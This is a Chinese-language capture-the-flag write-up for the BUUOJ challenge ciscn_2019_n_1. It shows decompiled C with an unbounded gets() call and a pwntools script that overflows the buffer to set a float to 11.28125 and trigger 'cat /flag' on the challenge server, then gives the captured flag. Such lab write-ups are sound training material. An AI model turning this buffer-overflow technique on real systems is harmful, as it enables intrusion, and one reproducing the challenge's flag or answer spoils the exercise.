# ciscn_2019_n_1

[题目地址](https://buuoj.cn/challenges#ciscn_2019_n_1)

这题1分。然而知识点我竟然不知道。白学了。

程序本身很简单，关键函数func如下。

```c
void func(void)

{
  char local_38 [44];
  float local_c;
  
  local_c = 0.0;
  puts("Let\'s guess the number.");
  gets(local_38);
  if (local_c == _DAT_004007f4) {
    system("cat /flag");
  }
  else {
    puts("Its value should be 11.28125");
  }
  return;
}
```

这都会吧，溢出变量更改指定值。然而我却卡在了小数的16进制表示上，11.28125我怎么发送啊，pwntools用p64只能打包整数。不过if语句指示local_c应该和_DAT_004007f4相同。

```
                             DAT_004007f4                                    XREF[2]:     func:004006a7(R), 
                                                                                          func:004006b5(R)  
        004007f4 00              ??         00h
        004007f5 80              ??         80h
        004007f6 34              ??         34h    4
        004007f7 41              ??         41h    A
```

发现DAT_004007f4值为0x413480。因为小端，从后往前读，同时这里是不足8位的，所以自己加几个\x00补齐。然而这次的\x00竟然是补在后面而不是平常的前面。

```python
from pwn import *
payload=b'a'*(0x38-0xc)+p64(0x41348000)
p=remote("node4.buuoj.cn",27381)
p.sendline(payload)
p.interactive()
```

看大佬的[wp](https://blog.csdn.net/tqydyqt/article/details/104974202)有介绍一种用代码求得内存的方法。我的c语言真的不行啊。

### Flag
- flag{9649cb03-3231-49c5-b746-183620e2ae4c}